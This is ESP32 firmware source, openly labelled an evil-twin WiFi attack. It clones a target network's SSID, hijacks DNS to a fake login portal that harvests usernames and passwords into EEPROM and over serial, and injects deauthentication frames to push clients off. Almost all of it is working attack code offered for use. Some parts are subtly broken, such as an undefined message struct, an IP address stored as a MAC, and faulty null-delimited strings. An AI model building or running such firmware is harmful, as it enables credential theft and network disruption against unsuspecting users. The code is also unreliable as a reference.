/**
 * @file EvilTwin.ino
 * @brief ESP32 Evil Twin WiFi Attack Firmware
 */

#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <EEPROM.h>
#include <SPIFFS.h>
#include <esp_wifi.h>

// Configuration
#define AP_SSID "EvilTwin"
#define AP_PASSWORD "password123"
#define DNS_PORT 53
#define WEB_PORT 80
#define LED_PIN 2
#define BUFFER_SIZE 1024

// EEPROM offsets
#define EEPROM_CRED_COUNT 0
#define EEPROM_CRED_START 4

// Global objects
DNSServer dnsServer;
WebServer webServer(WEB_PORT);

// State variables
String targetSSID = "";
String targetBSSID = "";
bool attackRunning = false;
bool deauthRunning = false;
int connectedClients = 0;
int credentialCount = 0;
unsigned long lastStatusUpdate = 0;
unsigned long deauthTimer = 0;

// Deauth packet structure
typedef struct {
    uint16_t frameControl;
    uint16_t duration;
    uint8_t destAddr[6];
    uint8_t srcAddr[6];
    uint8_t bssid[6];
    uint16_t seqControl;
    uint8_t reasonCode[2];
} __attribute__((packed)) DeauthFrame;

// Credential storage
struct StoredCredential {
    char ssid[32];
    char username[32];
    char password[32];
    char clientMac[18];
    bool valid;
};

// Serial protocol
enum SerialMessageType {
    MSG_HELLO = 0x01,
    MSG_SCAN_START = 0x02,
    MSG_SCAN_RESULT = 0x03,
    MSG_ATTACK_START = 0x04,
    MSG_ATTACK_STOP = 0x05,
    MSG_DEAUTH_START = 0x06,
    MSG_DEAUTH_STOP = 0x07,
    MSG_CREDENTIAL = 0x08,
    MSG_STATUS = 0x09,
    MSG_ERROR = 0x0A,
    MSG_ACK = 0x0B,
    MSG_NACK = 0x0C
};

// Forward declarations
void setupSerial();
void processSerialCommand();
void handleRoot();
void handleLogin();
void handleNotFound();
void startAttack(String ssid, String bssid);
void stopAttack();
void startDeauth();
void stopDeauth();
void sendStatus();
void sendCredential(String username, String password);
bool saveCredential(String ssid, String username, String password, String clientMac);
String macToString(uint8_t* mac);

void setup() {
    // Initialize serial
    Serial.begin(115200);
    Serial.setDebugOutput(true);
    
    // Initialize SPIFFS
    if (!SPIFFS.begin(true)) {
        Serial.println("SPIFFS Mount Failed");
        return;
    }
    
    // Initialize EEPROM
    EEPROM.begin(4096);
    
    // Setup LED
    pinMode(LED_PIN, OUTPUT);
    digitalWrite(LED_PIN, LOW);
    
    // Setup WiFi in station mode for scanning
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    
    // Send hello message
    SerialMessage msg;
    msg.type = MSG_HELLO;
    msg.length = 0;
    sendMessage(msg);
    
    Serial.println("ESP32 Evil Twin Firmware Ready");
}

void loop() {
    // Handle web server
    webServer.handleClient();
    dnsServer.processNextRequest();
    
    // Handle serial commands
    if (Serial.available()) {
        processSerialCommand();
    }
    
    // Update status periodically
    if (millis() - lastStatusUpdate > 5000) {
        lastStatusUpdate = millis();
        if (attackRunning) {
            sendStatus();
        }
    }
    
    // Deauth loop
    if (deauthRunning) {
        if (millis() - deauthTimer > 1000) {
            deauthTimer = millis();
            sendDeauthPackets();
        }
    }
}

void setupSerial() {
    Serial.begin(115200);
    while (!Serial) {
        delay(10);
    }
}

void processSerialCommand() {
    if (Serial.available() < 3) return;
    
    uint8_t type = Serial.read();
    uint16_t length = (Serial.read() << 8) | Serial.read();
    
    uint8_t buffer[length];
    for (int i = 0; i < length; i++) {
        buffer[i] = Serial.read();
    }
    
    switch (type) {
        case MSG_HELLO: {
            SerialMessage response;
            response.type = MSG_ACK;
            response.length = 0;
            sendMessage(response);
            break;
        }
        
        case MSG_SCAN_START: {
            scanNetworks();
            break;
        }
        
        case MSG_ATTACK_START: {
            // Parse SSID and BSSID
            String ssid = "";
            String bssid = "";
            
            // Find null terminator between SSID and BSSID
            int i = 0;
            while (i < length && buffer[i] != 0) {
                ssid += (char)buffer[i++];
            }
            i++; // Skip null terminator
            
            while (i < length) {
                bssid += (char)buffer[i++];
            }
            
            startAttack(ssid, bssid);
            break;
        }
        
        case MSG_ATTACK_STOP: {
            stopAttack();
            break;
        }
        
        case MSG_DEAUTH_START: {
            String bssid = "";
            for (int i = 0; i < length; i++) {
                bssid += (char)buffer[i];
            }
            startDeauth();
            break;
        }
        
        case MSG_DEAUTH_STOP: {
            stopDeauth();
            break;
        }
        
        case MSG_STATUS: {
            sendStatus();
            break;
        }
        
        default: {
            SerialMessage response;
            response.type = MSG_NACK;
            response.length = 0;
            sendMessage(response);
            break;
        }
    }
}

void scanNetworks() {
    int n = WiFi.scanComplete();
    if (n == -2) {
        WiFi.scanNetworks(true);
    } else if (n > 0) {
        for (int i = 0; i < n; i++) {
            String ssid = WiFi.SSID(i);
            String bssid = WiFi.BSSIDstr(i);
            int channel = WiFi.channel(i);
            int rssi = WiFi.RSSI(i);
            String security = "Unknown";
            
            wifi_auth_mode_t authMode = WiFi.encryptionType(i);
            switch (authMode) {
                case WIFI_AUTH_OPEN: security = "Open"; break;
                case WIFI_AUTH_WEP: security = "WEP"; break;
                case WIFI_AUTH_WPA_PSK: security = "WPA-PSK"; break;
                case WIFI_AUTH_WPA2_PSK: security = "WPA2-PSK"; break;
                case WIFI_AUTH_WPA_WPA2_PSK: security = "WPA/WPA2-PSK"; break;
                case WIFI_AUTH_WPA2_ENTERPRISE: security = "WPA2-Enterprise"; break;
                default: security = "Unknown"; break;
            }
            
            // Send scan result
            String result = ssid + "\0" + bssid + "\0" + 
                           String(channel) + "\0" + String(rssi) + "\0" + 
                           security + "\0";
            
            SerialMessage msg;
            msg.type = MSG_SCAN_RESULT;
            msg.length = result.length();
            msg.data = std::vector<uint8_t>(result.begin(), result.end());
            sendMessage(msg);
        }
        WiFi.scanDelete();
    }
}

void startAttack(String ssid, String bssid) {
    if (attackRunning) {
        stopAttack();
    }
    
    targetSSID = ssid;
    targetBSSID = bssid;
    
    // Setup AP mode
    WiFi.mode(WIFI_AP);
    WiFi.softAP(ssid.c_str());
    
    // Get AP IP
    IPAddress apIP = WiFi.softAPIP();
    
    // Setup DNS
    dnsServer.start(DNS_PORT, "*", apIP);
    
    // Setup web server
    webServer.on("/", handleRoot);
    webServer.on("/login", HTTP_POST, handleLogin);
    webServer.onNotFound(handleNotFound);
    webServer.begin();
    
    attackRunning = true;
    
    // Send ACK
    SerialMessage msg;
    msg.type = MSG_ACK;
    msg.length = 0;
    sendMessage(msg);
    
    Serial.println("Attack started on " + ssid);
}

void stopAttack() {
    if (!attackRunning) return;
    
    webServer.stop();
    dnsServer.stop();
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    
    attackRunning = false;
    deauthRunning = false;
    connectedClients = 0;
    
    // Send ACK
    SerialMessage msg;
    msg.type = MSG_ACK;
    msg.length = 0;
    sendMessage(msg);
    
    Serial.println("Attack stopped");
}

void startDeauth() {
    deauthRunning = true;
    deauthTimer = millis();
    
    SerialMessage msg;
    msg.type = MSG_ACK;
    msg.length = 0;
    sendMessage(msg);
    
    Serial.println("Deauth started");
}

void stopDeauth() {
    deauthRunning = false;
    
    SerialMessage msg;
    msg.type = MSG_ACK;
    msg.length = 0;
    sendMessage(msg);
    
    Serial.println("Deauth stopped");
}

void sendDeauthPackets() {
    // In ESP32, we need to use promiscuous mode for packet injection
    // This is a simplified implementation
    
    // Get list of connected stations
    wifi_sta_list_t stationList;
    esp_wifi_ap_get_sta_list(&stationList);
    
    for (int i = 0; i < stationList.num; i++) {
        uint8_t* mac = stationList.sta[i].mac;
        
        // Send deauth packet to this station
        sendDeauthPacket(mac);
    }
}

void sendDeauthPacket(uint8_t* clientMac) {
    // Build deauth frame
    uint8_t packet[26];
    
    // Frame control: Deauth (type 0, subtype 12)
    packet[0] = 0xC0;
    packet[1] = 0x00;
    
    // Duration
    packet[2] = 0x00;
    packet[3] = 0x00;
    
    // Destination address (client)
    memcpy(&packet[4], clientMac, 6);
    
    // Source address (AP)
    uint8_t apMac[6];
    esp_read_mac(apMac, ESP_MAC_WIFI_SOFTAP);
    memcpy(&packet[10], apMac, 6);
    
    // BSSID (AP)
    memcpy(&packet[16], apMac, 6);
    
    // Sequence control
    packet[22] = 0x00;
    packet[23] = 0x00;
    
    // Reason code: Deauth because of inactivity
    packet[24] = 0x04;
    packet[25] = 0x00;
    
    // Send packet using promiscuous mode
    esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
}

void handleRoot() {
    String html = "<!DOCTYPE html>"
                  "<html>"
                  "<head><title>WiFi Login</title>"
                  "<style>"
                  "body{font-family:Arial;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);"
                  "margin:0;padding:0;display:flex;justify-content:center;align-items:center;"
                  "min-height:100vh;}"
                  ".container{background:white;padding:40px;border-radius:10px;"
                  "box-shadow:0 10px 40px rgba(0,0,0,0.3);width:350px;}"
                  "h1{color:#333;text-align:center;margin-bottom:30px;}"
                  ".logo{text-align:center;font-size:48px;margin-bottom:20px;}"
                  "input[type='text'],input[type='password']{width:100%;padding:12px;"
                  "margin:8px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box;"
                  "font-size:14px;}"
                  "button{width:100%;padding:12px;background:#667eea;color:white;border:none;"
                  "border-radius:4px;font-size:16px;cursor:pointer;}"
                  "button:hover{background:#5a67d8;}"
                  ".footer{text-align:center;margin-top:20px;color:#888;font-size:12px;}"
                  "</style>"
                  "</head>"
                  "<body>"
                  "<div class='container'>"
                  "<div class='logo'>🌐</div>"
                  "<h1>WiFi Login</h1>"
                  "<form action='/login' method='POST'>"
                  "<input type='text' name='username' placeholder='Username' required>"
                  "<input type='password' name='password' placeholder='Password' required>"
                  "<button type='submit'>Connect</button>"
                  "</form>"
                  "<div class='footer'>Secure WiFi Network</div>"
                  "</div>"
                  "</body>"
                  "</html>";
    
    webServer.send(200, "text/html", html);
}

void handleLogin() {
    if (webServer.hasArg("username") && webServer.hasArg("password")) {
        String username = webServer.arg("username");
        String password = webServer.arg("password");
        
        // Get client MAC
        String clientMac = webServer.client().remoteIP().toString();
        
        // Save credential
        saveCredential(targetSSID, username, password, clientMac);
        
        // Send credential to PC via serial
        sendCredential(username, password);
        
        // Send success page
        String html = "<!DOCTYPE html>"
                      "<html>"
                      "<head><title>Connected</title>"
                      "<style>"
                      "body{font-family:Arial;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);"
                      "margin:0;padding:0;display:flex;justify-content:center;align-items:center;"
                      "min-height:100vh;}"
                      ".container{background:white;padding:40px;border-radius:10px;"
                      "box-shadow:0 10px 40px rgba(0,0,0,0.3);width:350px;text-align:center;}"
                      "h1{color:#333;}"
                      ".check{font-size:64px;color:#48bb78;}"
                      "</style>"
                      "</head>"
                      "<body>"
                      "<div class='container'>"
                      "<div class='check'>✅</div>"
                      "<h1>Connected!</h1>"
                      "<p>You are now connected to the WiFi network.</p>"
                      "</div>"
                      "</body>"
                      "</html>";
        
        webServer.send(200, "text/html", html);
    } else {
        webServer.send(400, "text/plain", "Bad Request");
    }
}

void handleNotFound() {
    webServer.send(200, "text/html", 
                   "<html><head><meta http-equiv='refresh' content='0;url=/'></head></html>");
}

void sendCredential(String username, String password) {
    String data = targetSSID + "\0" + username + "\0" + password + "\0";
    
    SerialMessage msg;
    msg.type = MSG_CREDENTIAL;
    msg.length = data.length();
    msg.data = std::vector<uint8_t>(data.begin(), data.end());
    sendMessage(msg);
}

bool saveCredential(String ssid, String username, String password, String clientMac) {
    int credCount = EEPROM.read(EEPROM_CRED_COUNT);
    
    if (credCount >= 10) {
        return false;  // Max 10 credentials stored
    }
    
    int addr = EEPROM_CRED_START + credCount * sizeof(StoredCredential);
    StoredCredential cred;
    
    strncpy(cred.ssid, ssid.c_str(), sizeof(cred.ssid) - 1);
    strncpy(cred.username, username.c_str(), sizeof(cred.username) - 1);
    strncpy(cred.password, password.c_str(), sizeof(cred.password) - 1);
    strncpy(cred.clientMac, clientMac.c_str(), sizeof(cred.clientMac) - 1);
    cred.valid = true;
    
    EEPROM.put(addr, cred);
    EEPROM.write(EEPROM_CRED_COUNT, credCount + 1);
    EEPROM.commit();
    
    return true;
}

void sendStatus() {
    // Format: RUNNING\0CLIENTS\0CREDENTIALS\0DEAUTH_PACKETS
    String status = String(attackRunning ? "1" : "0") + "\0" +
                    String(connectedClients) + "\0" +
                    String(credentialCount) + "\0" +
                    String(0) + "\0";
    
    SerialMessage msg;
    msg.type = MSG_STATUS;
    msg.length = status.length();
    msg.data = std::vector<uint8_t>(status.begin(), status.end());
    sendMessage(msg);
}

void sendMessage(const SerialMessage& msg) {
    Serial.write(static_cast<uint8_t>(msg.type));
    Serial.write(static_cast<uint8_t>(msg.length >> 8));
    Serial.write(static_cast<uint8_t>(msg.length & 0xFF));
    if (msg.length > 0 && !msg.data.empty()) {
        Serial.write(msg.data.data(), msg.length);
    }
}

String macToString(uint8_t* mac) {
    char buffer[18];
    snprintf(buffer, sizeof(buffer), "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return String(buffer);
}
